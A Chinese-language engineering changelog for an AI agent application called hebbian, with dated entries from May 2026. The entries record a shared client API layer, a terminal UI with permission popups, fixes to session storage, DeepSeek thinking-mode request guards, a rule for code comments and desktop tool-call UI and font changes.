  - **BeforeModelCall 的 `system_prefix` patch 未接通**：HookPatch 字段已留，但 agent_loop 在 BeforeModelCall 点位的处理还停留在旧 `PrependSystem(String)` 单一形式——未来把 BeforeModelCall trigger 路径改为消费 Modify 后能完整接通
  - **PostToolUseFailure 改 result 未实现**：失败路径调 `PostToolUseFailure` 不消费 patch（语义上 hook 不应该把失败洗成成功）；若用户想脱敏失败信息，需要走 `Notification` 点位
  - **HookPatch 字段命名 vs 架构.md §4.8.2 文档**：架构 doc 示例用 `patch.input`，本期实现一致；后续如果加 `patch.deny: bool` 等扩展字段需要回看
- **关联**: 架构.md §4.8.2 / §4.8.4；上一条 changelog（小尾巴接通）

### 2026-05-11 — Step 4 — CoreClient 共享层（surface 同步 API 统一入口）

- **Why**: 推进架构.md §7：让 CLI 和 Desktop 调同一份同步 API。之前两 surface 各自 import storage / model_gateway 函数，未来加 RPC 远端版（架构 §7.2）会让 surface 散落到处都要改。落 `CoreClient` trait + `LocalCoreClient` 实现后，所有同步入口走单一对象，加 `HttpCoreClient` 时仅替换工厂
- **改动**:
  - 新建 [crates/agent-core/src/core_client/mod.rs](../crates/agent-core/src/core_client/mod.rs)：`CoreClient` trait（async_trait，对话流 `submit/subscribe` + 同步 API 共 22 个方法），`LocalCoreClient` 实现持 `data_dir / Option<Arc<Harness>> / Option<Arc<PermissionStore>>`。Harness 设为 Option：CLI 长生命周期可挂全局 Harness，Desktop 在 send_message 时按需构造 Harness 走 chat 模块——CoreClient 仅做同步 API 转发。所有方法直接调对应 `storage::*` / `model_gateway::*` 函数；`subscribe` 返回 `Unsupported`（surface 直接消费 RunHandle，跨进程 broadcast 留尾巴）
  - 新建 [crates/agent-core/src/core_client/http.rs](../crates/agent-core/src/core_client/http.rs)：`HttpCoreClient` 仅占位（`base_url` + `new` 构造，无 trait 实现），架构 §7.2 远端版未实施
  - [crates/agent-core/src/lib.rs](../crates/agent-core/src/lib.rs): 注册 `pub mod core_client`
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs)：AppState 加 `Arc<LocalCoreClient>`；启动时构造 `LocalCoreClient::new(None, data_dir, permission_store)` 并 `.manage(...)`。13 个 Tauri command 改为 `core(&app)?.<method>()` 转发：`get_providers / save_providers / upsert_provider / list_provider_presets / fetch_provider_models / test_provider_model / list_prompts / upsert_prompt / delete_prompt / set_default_prompt / list_sessions / get_session / rename_session / delete_session / search_sessions / list_tools / get_settings / save_settings`。新增 `core(&app)` helper + `map_core_err`
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs)：启动时构造 `Arc<dyn CoreClient>`；`print_history_list / handle_providers_command / list_providers / set_default_provider_model` 改为接 `&dyn CoreClient` 转发；原本独立 open 的 PermissionStore 与 core_client 共用一份避免重复打开
- **未改 / 未转发的 command**:
  - 复杂 chat 流：`send_message / preview_session_payload / compact_session / inject_user_message / get_context_usage` 继续走 chat 模块直接构造 Harness（架构 §3.1 对话流，submit/subscribe 的真正落地）
  - 会话生命周期：`create_session / fork_session / truncate_after / truncate_inclusive / update_session_config / switch_provider_model / generate_session_title / update_session_settings / approve_path_access / attach_path` 继续走 storage 直调（这些 command 有跨字段事务 / marker 插入 / session 目录布局兜底等逻辑，trait 不收）
  - HITL：`approve_permission / answer_question` 直接走 `HitlState`，不归 CoreClient
  - OAuth：所有 `oauth_*` 调用 `model_gateway::auth`，不归 CoreClient
  - `cancel_message`：走 `common::runtime::cancel`，不归 CoreClient
- **验证**: `cargo check --workspace --tests` 通过；`cargo test -p agent-core --lib` 130 项全过；前端 `pnpm exec tsc --noEmit` 0 错误
- **影响范围**: agent-core / cli / desktop。Tauri command 名字与参数 schema 完全不变，前端无感。`LocalCoreClient::new` 的 Harness 参数是 `Option<Arc<Harness>>` 与架构 §7.1 文档的"持 harness"不完全一致——目的是兼容 Desktop 的每会话 Harness 模式
- **留尾巴**:
  - **HttpCoreClient 仅占位**：架构 §7.2 远端版未实施。reqwest client + SSE 解码 + auth token + `since_seq` 断线重连均未写
  - **`subscribe(RunId)` 返回 Unsupported**：本期 surface 直接消费 `RunHandle.recv()`。未来 multi-surface 同时观察同一 run 时需要在 Harness 加 broadcast 通道
  - **CoreClient trait 是窄接口**：仅收架构 §3.2 中明确列出的方法。`exportSession / refreshOAuth / getTokenUsage / getProviderQuota / installSkill / getRecentTraces / getTrace` 等 §3.2 项暂未收入（功能未实现或不归 CoreClient 管）；后续随实现完整度增补
  - **Tauri command 转发不完全**：仍有 10+ 个 command 走 storage 直调（list 见上）。完整迁移需要为这些场景在 CoreClient 加方法（如 `fork_session / truncate_session`）或单独走另一个 trait（事务类 command）
  - **CoreError 字段宽**：`Storage(AppError)` + `Gateway(String)` 是兼容当下，未来加 `RpcTransport` 等远端错误时要重构
- **关联**: 架构.md §7.1 / §7.2 / §7.3 / §3.2


### 2026-05-11 — Step 13 — TUI ratatui（默认 CLI 全屏模式）

- **Why**: 推进架构.md §8——给 CLI 加一份全屏 TUI（参考 codex codex-rs/tui 思路），让交互式调试时有完整的「user / assistant / 工具调用气泡 / HITL 弹窗 / 状态栏」体验。原 REPL（rustyline）模式作为非 TTY / 显式 --repl 的回退保留
- **改动**:
  - apps/cli/Cargo.toml：加 `ratatui = "0.28"` + `crossterm = "0.28" (event-stream)` + `futures-util = "0.3"`
  - 新建 [apps/cli/src/tui/mod.rs](../apps/cli/src/tui/mod.rs)：暴露 `run_tui`
  - 新建 [apps/cli/src/tui/theme.rs](../apps/cli/src/tui/theme.rs)：集中颜色与样式（user_prefix / assistant_text / reasoning_text / tool_call / tool_failure / auto_judged_* / status_bar / popup_*）
  - 新建 [apps/cli/src/tui/app.rs](../apps/cli/src/tui/app.rs)：`App` 主结构 + 主循环。三路 race（crossterm EventStream / 当前 RunHandle.recv() / tokio interval 200ms tick），输入按 Enter 提交 `Session::run()`，event 流增量更新 chat view assistant block，RunFinished/Failed/Cancelled 时清 active_run + commit_assistant 到 transcript。F2 循环切换 RunMode、PgUp/PgDn 滚动、Ctrl+C 中断或退出、Shift+Enter 多行
  - 新建 [apps/cli/src/tui/observer.rs](../apps/cli/src/tui/observer.rs)：仅占位（TUI 不走 TurnObserver；ratatui 重绘 + select event race 用 RunHandle.recv() 更直接）
  - 新建 [apps/cli/src/tui/components/chat_view.rs](../apps/cli/src/tui/components/chat_view.rs)：`ChatView` + `ChatBlock { User / Assistant / ToolCall / AutoJudged / Note }`，scroll/follow_bottom，把 blocks 转 `Vec<Line<'static>>` 喂 Paragraph
  - 新建 [apps/cli/src/tui/components/input_box.rs](../apps/cli/src/tui/components/input_box.rs)：单 buffer 多行输入框，提供 push_char / pop_char / clear / take
  - 新建 [apps/cli/src/tui/components/status_bar.rs](../apps/cli/src/tui/components/status_bar.rs)：底部一行：`provider·model ─ used/budget tokens (pct%) ─ RunMode ─ step m{n}/t{n}`
  - 新建 [apps/cli/src/tui/components/permission_popup.rs](../apps/cli/src/tui/components/permission_popup.rs)：居中弹窗 + 4 档选项（a/b/c/d → AllowOnce / AllowAndRemember(Session) / AllowAndRemember(Global) / Deny），Esc = Deny
  - 新建 [apps/cli/src/tui/components/question_popup.rs](../apps/cli/src/tui/components/question_popup.rs)：题目 + 选项（1-9 数字键，multi 时勾选 / 单选立即提交）+ Tab 切自由输入 + Esc Cancelled
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs)：加 `--tui / --repl` flag（互斥），加 `is_tty()` helper；路由逻辑改为：显式 flag > 默认（无 prompt / 无 --json 且 isatty）走 TUI；其它情况按原逻辑（REPL / single / json）
  - [apps/cli/src/session.rs](../apps/cli/src/session.rs)：`CliSession::into_tui_parts()` 拆出 inner `Session / provider_display / run_mode / persist`；`PersistRef` 提为 `pub struct`
- **验证**: `cargo check --workspace --tests` 通过；`cargo test -p agent-core --lib` 130 项全过；`cargo build -p hebbian-cli` 通过（生成 target/debug/hebbian-cli）；前端 `pnpm exec tsc --noEmit` 0 错误
- **影响范围**: apps/cli 内部。新增依赖 ratatui / crossterm / futures-util，编译时间 +若干秒。CLI 默认行为变化：从「无参 → REPL」变为「无参且 isatty → TUI；否则 REPL（兼容管道 / CI）」。`--repl` 强制走旧 rustyline，无破坏
- **留尾巴**:
  - **TUI 模式 inject_pending_input 未接通**：流式中输入框打字 Enter 会被拒（提示「等待当前 run 结束或 Ctrl+C」），架构 §4.3 / pending_inputs 队列在 TUI 路径未启用；REPL 没此能力，但 desktop 有
  - **TUI 与 Session::commit_assistant 的握手**：当前在 RunFinished 时 commit 最终文本到 transcript + 持久化 user/assistant 到 session.jsonl；但中途取消（Ctrl+C）时不 commit 部分输出——与 desktop 的 partial sidecar 不一致
  - **F2 切 RunMode 是本地状态**：当前只更新 status_bar + Note，不真切到 Session 内部的 RunMode（架构 §13 留尾巴：Op::SwitchRunMode actor 只 emit，dispatcher 仍读 spawn 时的 mode）
  - **Permission popup 不识别 Bash fingerprint 级 `AllowAndRemember`**：TUI 只给"工具名级"4 档；REPL 走 inquire 时能给"始终允许 `git status`"细粒度。架构 §4.6.1 完整支持但 TUI 路径未做
  - **状态栏 step 计数器不精确**：当前只看 StepStarted Model 事件累加，工具 step 数靠 ToolCallStarted 推；run 重置时计数不清零
  - **--resume / --auto-approve / 单次模式渲染共享 §8.3.2**：本期未实施 §8.3.3 / §8.3.4 / §8.3.5 退出码 42/43 等 CI 友好语义
  - **TuiObserver 模块为占位**：`observer.rs` 仅 struct 定义，未实现 TurnObserver；ratatui 路径不走 driver/observer 模式
  - **Subagent / Sidebar / PlanView 未实施**：架构 §8.2 草图中提到的 sidebar / plan_view 不做（D9 决策不实施 multi-agent）
- **关联**: 架构.md §8 / §4.3 / §10.1；Step 4 changelog（CoreClient 共享层）


### 2026-05-11 — 修复 HEBBIAN_DUMP_MODEL_IO 污染 session 列表 + 加目录扫描防御

- **Why**: 启用 `HEBBIAN_DUMP_MODEL_IO=1` 后，dump 文件按 `<data_dir>/sessions/<sid>.model_io.jsonl` 平铺写入 `sessions/` 根目录。下次启动时 `migrate_legacy_layout_if_needed` 把它当成 legacy 平铺 session：`file_stem()` 取到 `<sid>.model_io` 当 session_id 错误迁移到 `<sid>.model_io/session.jsonl`；后续 `all_session_files` 又把这个目录识别成新布局 session，`read_jsonl` 解析模型 IO 记录直接报「missing field `type` at line ...」一连串 warn。违反架构 §4.9.1 / §6.1「一段对话所有文件落在 `<sid>/` 目录内」
- **改动**:
  - [crates/agent-core/src/model_io_dump.rs](../crates/agent-core/src/model_io_dump.rs) `default_path`：路径从 `<data_dir>/sessions/<sid>.model_io.jsonl` 改为 `<data_dir>/sessions/<sid>/model_io.jsonl`，与 `tool_results/` `compactions/` `plans/` `partial/` 同级，遵循 §4.9.1。更新模块 docstring 与 `ENV_VAR` 文档
  - [crates/agent-core/src/storage/sessions.rs](../crates/agent-core/src/storage/sessions.rs)：
    - `is_session_file`：新增过滤——`file_stem` 含 `.` 视为辅助 sidecar（session_id 规范不含 `.`）。这样将来任何 `<sid>.<sub>.jsonl` 都不会被误识别为 session
    - `all_session_files`：扫到目录时跳过「目录名含 `.`」的（清理历史脏数据 `<sid>.model_io/` 不再当 session）
    - `migrate_legacy_layout_if_needed`：原本只看 extension == jsonl 就迁移，改为统一走 `is_session_file`（同时覆盖平铺与 `<date>/<id>.jsonl` 两条路径），不再把 sidecar 拖进 legacy migration
- **影响范围**: agent-core/storage（仅 session 列表 + legacy migration 路径）、agent-core/model_io_dump（dump 路径变更）。架构.md §4.9.1 / §6.1 目录树同步追加 `model_io.jsonl` 一行。无协议变更、无破坏 session.jsonl 格式
- **留尾巴**:
  - **历史脏数据未自动清理**：仓库主人本地 `~/.hebbian/sessions/` 下可能已有 `<sid>.model_io/` 目录与原始 `<sid>.model_io.jsonl` 文件。代码侧已彻底过滤不再展示/迁移，但磁盘文件仍在；如需清理可执行 `find ~/.hebbian/sessions -maxdepth 1 -name '*.model_io*' -print` 确认后手动 `rm -rf`
  - **未补回归测试**：依赖手动 `HEBBIAN_DUMP_MODEL_IO=1 hebbian "hi"` + 再次启动观察日志验证。后续可加 storage 层单测：构造 `sessions/abc.model_io.jsonl` 平铺文件，断言 `list / migrate_legacy_layout_if_needed` 都不动它
- **关联**: 架构.md §4.9.1 / §6.1 / §4.9.3


### 2026-05-11 — 修复桌面 send_message 走错 data_dir 导致「session not found」

- **Why**: 用户反馈「新建对话、输入框发消息后立即 not found」。排查发现 desktop 有两份 `data_dir` 函数：[apps/desktop/src/lib.rs:32](../apps/desktop/src/lib.rs#L32) 走 `agent_core::storage::default_data_dir()` = `~/.hebbian/`（符合 §6.1 / D10）；[apps/desktop/src/chat.rs:53](../apps/desktop/src/chat.rs#L53) 却走 Tauri 的 `app.path().app_data_dir()`，macOS 下指向 `~/Library/Application Support/dev.ricardo.hebbian/`。结果：`create_session` 把 session.jsonl 写到 `~/.hebbian/sessions/<sid>/`，紧接着 `send_message → sessions::load(chat data_dir, sid)` 去 Tauri bundle 目录读，必然 not found；用户在 UI 看不见任何提示，直接 `session <id> not found` 抛出来
- **改动**:
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs) `data_dir`：改为 `agent_core::storage::default_data_dir()`，与 lib.rs 对齐
  - 同文件 `use tauri::{...}` 移除不再需要的 `Manager` import
- **影响范围**: 仅 desktop。修复后 `send_message / inject_user_message / get_context_usage / preview_session_payload / compact_session / generate_session_title` 等所有 chat 路径都用 `~/.hebbian/`，与 `create_session / list / get / fork / delete / update_session_settings` 完全一致
- **留尾巴**:
  - **历史脏数据**：如果之前 Tauri bundle 目录下被偶然写过文件（例如老 hook / 老路径残留），不会自动迁移；可执行 `ls ~/Library/Application\ Support/dev.ricardo.hebbian/ 2>/dev/null` 自查
  - **未补集成测试**：data_dir 错位是「两条代码路径写不同目录」的问题，纯单测不易覆盖；后续 desktop 应只保留一份 `data_dir` 函数（或挪到 `agent_core::storage` 顶层，全 surface 共享），杜绝再次走偏
- **关联**: 架构.md §6.1 / 决策 D10


### 2026-05-11 — 修复 list 历史脏数据刷屏 warn：pretty-JSON 自愈 + rollout-*/ 目录过滤

- **Why**: 用户报「日志很多 `[hebbian] skip malformed rollout line ...session.jsonl:78: invalid type: string "created_at"` warn」。两类历史脏数据导致：
  - 早期把老 `<id>.json`（pretty-printed JSON 整对象）裸 rename 成 `<id>/session.jsonl` 没做格式转换，文件按 jsonl 逐行扫描时每一行都「missing field type」
  - 早期 `migrate_legacy_to_new` 把孤儿 `rollout-<ts>-<uuid>.jsonl`（裸 `agent_core::Recorder` 事件流，无 schema header）当成平铺 legacy session 误迁成 `rollout-*/session.jsonl`，内容仍是裸 Event 解析必败
  - 本机磁盘上一次 list-history 触发 **8120 条 warn**
- **改动**:
  - [crates/agent-core/src/storage/sessions.rs](../crates/agent-core/src/storage/sessions.rs) `read_jsonl`：开头加 pretty-JSON 探测——首字符 `{` 后紧跟换行就用 `serde_json::from_str::<Session>` 整文件解析，成功后立刻用 `write_jsonl_full` 回写为合法 jsonl（自愈）。失败则降级到原 jsonl 逐行扫描，不阻塞 list
  - `all_session_files`：跳过新布局目录时增加「`rollout-` 前缀」过滤，跟 `is_session_file` 的 rollout 文件黑名单对齐
- **验证**: 跑 `./target/debug/hebbian-cli --list-history` 一次：8120 → 0 warn；list 输出 60+ 条 session 全部干净；自愈后磁盘上脏文件首行已变成 `{"type":"meta",...}` 标准 jsonl
- **测试**: 新增 `list_self_heals_pretty_json_session_files` 单测——构造 pretty-printed JSON 文件 → list 后断言能拿到 SessionMeta 且文件首行已是 `RolloutLine::Meta`
- **影响范围**: agent-core/storage。仅读侧兜底 + 自愈写一次，写后行为完全等同于新建 session。无协议变更
- **留尾巴**:
  - `rollout-*/session.jsonl` 与 `<sid>.model_io/session.jsonl` 这类脏目录仅被「不扫描」处理，磁盘文件没清。如需彻底清理可执行：`find ~/.hebbian/sessions -maxdepth 1 -type d \( -name 'rollout-*' -o -name '*.model_io' \)` 看一眼后手动 `rm -rf`
  - pretty-JSON 自愈是一次性的：第一次 list 会写一次盘；如果该 session 同时被其它进程读，第一次读可能看到旧 pretty JSON（自愈是 atomic rename，但只在第一次 read 时触发）
- **关联**: 架构.md §4.9.1 / §4.9.6



### 2026-05-12 — DeepSeek thinking 路径借鉴 openhanako 四项守卫 + utility 短调用

- **Why**: 用户对照 openhanako [`core/provider-compat/deepseek.js`](../../openhanako/core/provider-compat/deepseek.js) 后指出 hebbian 的 DeepSeek v4 thinking 适配缺四道保险，希望借鉴过来。openhanako 落这四道保险的原因记录在它的注释里（issue #468 等历史踩坑）：tool_calls 多轮缺 reasoning_content 时 server 会 400、v4 thinking + tool_replay 要求 content 非 null、anthropic 端点要求 thinking block 续传、生成标题这种短输出场景不该耗 thinking 预算
- **改动**:
  - [crates/model-gateway/src/protocols/openai.rs](../crates/model-gateway/src/protocols/openai.rs) `apply_deepseek_compat`：
    - 改返回 `Result<(), ModelError>`；带传 `build_body -> Result<Value, ModelError>` 透传到 `providers::openai`
    - thinking 启用时遍历 messages，对「assistant + tool_calls」做 fail-closed：缺 `reasoning_content` 字段 → 抛 `ModelError::Other`（消息引导用户压缩或开新会话）
    - 同一遍历里把这些 assistant 的 `content:null` 收紧成 `""`（v4 thinking + tool_replay 契约）
    - thinking 关闭时主动剥掉历史 `reasoning_content`，避免 server 在「disabled 却带字段」时拒绝
  - [crates/model-gateway/src/protocols/anthropic.rs](../crates/model-gateway/src/protocols/anthropic.rs) `build_body`：
    - 同样改 Result 形态
    - 新增 `is_deepseek_v4_anthropic_dialect` 分支：`deepseek-v4*`（非 nothinking）走 DeepSeek 方言——`thinking:{type:"enabled"|"disabled"}` + `output_config:{effort:"high"|"max"}` + `max_tokens` 抬升到 65536/131072
    - `entry_to_message` 增加 `inject_deepseek_thinking` 参数：在该方言下把 `AssistantEntry.reasoning` 注入为 `{type:"thinking",thinking}` content block，供 v4 续推理链
    - tool_use 多轮 fail-closed：缺非空 thinking block → 抛 `ModelError::Other`
    - 顺手修正预存 fail 的 `non_oauth_keeps_plain_string_system` 测试断言（apply_cache_control 早就会把 system 字符串升格为 block 数组）
  - [crates/agent-core/src/session_titler.rs](../crates/agent-core/src/session_titler.rs)（新增）：utility 短调用 helper `generate_title(client, model, user_msg)`——`ReasoningConfig.enabled=Some(false)` + 无工具 + `max_tokens=128` + sanitize 截断 32 字。**不挂自动钩子**，由 surface 按需触发；这次只把工具放到那。命名是 utility 短调用而非新 RunMode，避免污染 §4.4.3 的 4 种 mode
  - [docs/架构.md](架构.md) §5.2：表格里 DeepSeek 行的「协议」补 `/ Anthropic Messages`；新增 §5.2.1 写清 DeepSeek 方言双协议路径的字段差异、公共规则、与 openhanako 对齐的来源、Step 12 迁移轨迹
- **影响范围**:
  - 协议层：`build_body` 返回类型从 `Value` 变 `Result`，**调用方需 `?` 透传**；目前只有 `providers/openai.rs` / `providers/anthropic.rs` 两处用，已同步。
  - 用户感知：开 DeepSeek thinking + 工具循环时，若历史缺 reasoning（多见于跨版本/旧 session 续接），不再悄悄丢推理链，而是显式抛错，让用户压缩或开新会话——是行为变更，需在 surface 文案上注意
  - 测试：model-gateway 新增 9 个 unit test（5 个 OpenAI 路径 + 4 个 Anthropic 路径），agent-core 新增 3 个 session_titler test
- **留尾巴**:
  - 改动 5 仅落「短调用 helper」，**没有挂自动触发**。下一步选项：①在 Session 第一条 user 落盘后异步触发 ②在压缩工件生成后触发摘要标题。需要 surface / Session lifecycle 再讨论
  - DeepSeek v4 on Anthropic 端点路径目前**没有实测真实流量**——逻辑按 openhanako 形态实现 + 单测覆盖，但首次有用户真用这条端点时可能仍需调字段
  - 架构.md §5.2.1 提及「这两段属于业务感知协议适配，按 §4.11 应迁到 model_adapters/」——Step 12 仍未启动；本次保持既有 hack 形态在 gateway 内，避免双线改动
  - openhanako 还有跨模型 thinking-block → reasoning_content 恢复（`extractReasoningFromContent`），hebbian 暂未实现——hebbian 内部 `AssistantEntry.reasoning` 是单一来源，不存在跨协议形态转换的场景，先不抄
- **关联**: openhanako `core/provider-compat/deepseek.js`；DeepSeek 官方文档 https://api-docs.deepseek.com/zh-cn/guides/thinking_mode（注意：官方文档明确「多轮不要回传 reasoning_content」，但 v4 thinking + tool_calls 实测必须回传，这是 openhanako/hebbian 共同选择的方言侧实现）

### 2026-05-12 — 注释规则：禁止在代码里引用外部项目名 + 清扫存量引用

- **Why**: 在上一条「借鉴 openhanako 四项守卫」改动里，我在代码注释里写了 8 处「与 openhanako xxx 一致 / 等价 / 同形」之类的引用。用户指出这种引用对未来读代码的人没用——外部项目函数会重命名 / 文件会移动，注释会 rot 成考古碎片；他真要对比时会去看那个项目的 HEAD，而不是 hebbian 注释里某个时间点的引用。借鉴的事实、原因、好处坏处归 changelog，代码注释只写「这是什么 + 为什么必须这样」的当下事实
- **改动**:
  - [CLAUDE.md](../CLAUDE.md) §「步骤 3：实施」末尾新增一条强约束：**代码注释里禁止出现外部项目名 / 内部函数名 / 内部文件路径**，附正反例
  - 清掉本次新加的 8 处 + 顺手清掉 4 处存量引用：
    - [crates/model-gateway/src/protocols/openai.rs](../crates/model-gateway/src/protocols/openai.rs)：3 处（包括 1 处存量）
    - [crates/model-gateway/src/protocols/anthropic.rs](../crates/model-gateway/src/protocols/anthropic.rs)：5 处
    - [crates/agent-core/src/session_titler.rs](../crates/agent-core/src/session_titler.rs)：1 处
    - [crates/common/src/reasoning.rs](../crates/common/src/reasoning.rs)：1 处存量
    - [crates/agent-core/src/recorder.rs](../crates/agent-core/src/recorder.rs)：1 处存量「参考 codex 的 RolloutRecorder」
    - [crates/agent-core/src/system_prompt.rs](../crates/agent-core/src/system_prompt.rs)：1 处存量「集合 codex / claude-code / opencode 三家精华」
    - [crates/agent-core/src/context/compaction.rs](../crates/agent-core/src/context/compaction.rs)：1 处存量「参考 codex / claude-code 的 summarization 模板」
- **影响范围**: 纯注释清理，不动代码行为；workspace 编译通过，cargo test --workspace --lib 135 + 18 + 7 + 83 全过
- **留尾巴**: 无。新增规则后，未来 PR 里若再出现这类引用应被驳回

### 2026-05-12 — desktop tool_call 改 Timeline + TodoWrite 浮动右上角 TaskPanel

- **Why**: 用户在 [docs/tool-call-ui-prototypes.html](./tool-call-ui-prototypes.html) 里定下标准——相邻 tool_call 渲染成一条左侧带节点的时间线，遇到 content 就断成新的时间线；TaskList/TodoWrite 不再混在时间线里，而是浮在右上角的独立卡片，全部完成自动收起为小 pill，点击 timeline 里的历史 TaskList 仍可回放当时快照
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx)：
    - 新增 `TodoItem` 类型 + `parseTodos(argumentsText)`：兼容 `{todos: [...]}` / 顶层数组 / 字符串元素，宽容解析 `content`/`text`/`title`、`status` 三态、`activeForm`
    - 新增 `TodoChecklist`：grid checklist UI，区分 pending / in_progress（active 行高亮，显示 `activeForm`）/ completed（删除线）
    - 新增并导出 `extractLatestTodoSnapshot(session, streamingParts)`：从流式末端 / 历史消息倒序找最近一次 TaskList 调用，返回当时 todos 快照
    - 新增并导出 `FloatingTaskPanel`：absolute 在 ChatView 右上角（top-[64px] 避开 h-14 header），mount 时按 allDone 决定初始 collapsed；运行时仅 false→true transition 自动收起，尊重用户主动展开/关闭（用 useRef 跟踪 prevAllDone）
    - timeline 里 TaskList 不再 static——chevron 可旋转、可点击展开；展开后 detail 走 `TodoChecklist`（即"那次快照"）；`callSummary` 对 TaskList 输出 `N 项 · K 完成 · M 进行中`
    - 已有的「相邻 tool_call 聚成 timeline、遇到 content 断开」由 `buildAssistantRenderParts` 的 `pushToolGroup` 已经做了，本次未动逻辑
  - [apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx)：
    - 引入 `FloatingTaskPanel` + `extractLatestTodoSnapshot`
    - 在 header 之下、scroll 容器之外渲染浮动 panel，`key={currentSession.id}` 让切换会话时重置内部 collapsed 状态
- **影响范围**:
  - 仅 desktop 前端两个 .tsx 文件；不改协议 / Tool 列表 / prompt / storage / CLI
  - 不破坏既有 saved/streaming/legacy 三种 tool_call 数据形态——`parseTodos` 走 `argumentsText`，与 saved `arguments` string / streaming `arguments|input` 完全兼容
  - `pnpm exec tsc --noEmit` PASS；`cargo check --workspace` PASS（4 个 warning 与本次无关，cli 既有）
- **留尾巴**:
  - FloatingTaskPanel 全展开时 z-30，可能盖到第一条 MessageBubble hover 的 actionMenu（z-20）右上角；用户主动收起后变 pill 不挡。如果反馈不爽，再调整 z 或位置
  - TodoWrite/TaskList 工具目前在 agent-core 里没有显式 schema 实现（仅 prompt 声明 + effects.rs 白名单），所以 todos 入参格式按 Claude Code 习惯 `{todos: [{content, status, activeForm}]}` 解析；若后续后端真定义了不同 schema，需要同步 `parseTodos`

### 2026-05-12 — desktop tool_call detail 三处微调（Bash 命令头 / description 优先入参 / 放大窗解除内层限高）

- **Why**: 紧接上一条 Timeline 改造，用户提了三点反馈：
  1. Bash 详情黑框第一行没显示命令本体，看不出到底跑了什么——prototype 里是 `$ cargo check -p agent-core\n\n<output>`
  2. tool_name 后那个 description 槽位应该展示**模型在入参里写的 description**（更具体的意图说明），fallback 才回到 "运行命令" 这种通用动词
  3. 点放大图标弹出的窗口尺寸虽然小但**内部仍受 max-h-48 限制**导致需要二次滚动，要在合理大小内尽量一屏看完
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx)：
    - Bash / PowerShell detail：从 `callArgs` 取 `command`，拼成 `$ ${command}\n\n${result}` 作为 ToolPre 内容（外层 + 放大窗共用同一份 body）。BashOutput / KillShell 不加，保持 result 原样
    - 拆分 `callDescription`：抽出纯通用动词的 `defaultActionLabel(name)`，然后 `callDescription` 先读 `argString(args, "description")`（即模型入参里写的），有就用，没有 fallback `defaultActionLabel`。同时把 `callSummary` 里 Bash/PowerShell/自定义 fallback 中的 `argString(args, "description")` 删掉，避免和 description 槽重复
    - 新增 `ToolDetailExpandedContext`（React Context，默认 false），在 `ExpandButton` 打开的 modal 内层包一个 `Provider value={true}`；`ToolPre` / `RenderedMarkdown` / `SearchResults` / `DefaultToolDetail` 都 `useContext` 这个值，expanded 时去掉自己 `max-h-48` 限制；`SearchResults` 行数截断从 20 提升到 500
    - 放大窗外形：第一版改成了 `h/w = calc(100vh-2rem)` 占满视口（太大），按反馈改回 `max-w-5xl max-h-[85vh] w-full`，居中显示，刚好覆盖 chat 主体区域
- **影响范围**:
  - 仅 desktop 前端一个 .tsx 文件；不动协议 / 后端 / CLI
  - `callDescription` 行为变更：先看 args.description，可能改变历史消息上 tool_name 旁边显示的文字（之前固定通用动词，现在显示模型写的具体意图）。对没填 description 的 tool 没有变化
  - `pnpm exec tsc --noEmit` PASS
- **留尾巴**:
  - 模型有时把无意义的 description 也填进去（例如 "Run command"），UI 上会显示英文；这是模型行为问题，不在前端兜底
  - 放大窗 max-w-5xl ≈ 1024px，在超宽屏（4K）上会显得偏小，但 chat 主区域本身一般在这个量级，所以视觉上对齐

### 2026-05-12 — 内置 Maple Mono NF CN 字体（Bash 终端输出用）+ 微调

- **Why**: 上一条把 Bash detail 字体设成 `'Maple Mono NF CN'` 后只能依赖用户系统是否预装；用户要求内置，且粗体 / 斜体都要（终端输出里 markdown 偶尔带粗体，IDE 风格还原需要 italic / bold-italic）。同步把 timeline 整体加淡灰底（`bg-muted/30`）、展开 detail 字号 +2px、Bash detail 第一行加 `$ command`、放大窗回到 chat 区域大小（`max-w-5xl max-h-[85vh]`）
- **改动**:
  - 新增 [apps/desktop/frontend/src/assets/fonts/](../apps/desktop/frontend/src/assets/fonts/)：从 `subframe7536/maple-font` v7.9 release 取 NF-CN ttf，本地用 `woff2_compress` 转成 4 份 woff2：
    - `MapleMono-NF-CN-Regular.woff2`（6.0 M）
    - `MapleMono-NF-CN-Italic.woff2`（6.5 M）
    - `MapleMono-NF-CN-Bold.woff2`（6.1 M）
    - `MapleMono-NF-CN-BoldItalic.woff2`（6.5 M）
    - 总计 ~25 MB；NF（Nerd Font 图标）+ CN（含中文字符集）形态本身就大，没法再瘦
  - [apps/desktop/frontend/src/index.css](../apps/desktop/frontend/src/index.css) 顶部：4 个 `@font-face`，按 weight 400/700 × style normal/italic 拆开，`font-display: swap` 避免首屏闪烁
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx)：
    - `ToolPre` dark 分支字体改为 `font-['Maple_Mono_NF_CN',ui-monospace,SFMono-Regular,Menlo,monospace]`；浅色分支保持 `font-mono`
    - timeline 容器：`bg-muted/30` 常态淡灰底 + `rounded-md` + 内 padding
    - 展开 detail 内字号统一 +2：ToolPre 11→13、RenderedMarkdown 12→14、Ask/Image note 12→14、SearchResults 行/标签 11→13、各 file-bar 11→13、Default Input/Output 标签 10→12、args-table 11→13、TodoChecklist 11→13
- **影响范围**:
  - 仓库新增 ~25 MB 二进制资产；首次 `git clone` 会更慢；Tauri bundle 体积会增加同等量级（woff2 直接 bundle 在 dist/ 里）
  - 仅前端 CSS + 字体文件 + MessageBubble.tsx 改动，不动协议 / 后端 / CLI
  - `pnpm exec tsc --noEmit` PASS；字体许可 OFL 1.1 已附带在 LICENSE.txt（未单独抽出来 commit，子目录里没放许可证文本）
- **留尾巴**:
  - **字体许可文本未单独 commit**：OFL 1.1 要求保留许可证副本，应在 `assets/fonts/` 下放一个 `LICENSE.txt` 或在仓库根 NOTICE 文件提到。后续补
  - 没装 git-lfs，4 个 6 M woff2 直接进对象库；如果以后字体经常更换、commit 历史膨胀，可以考虑 LFS
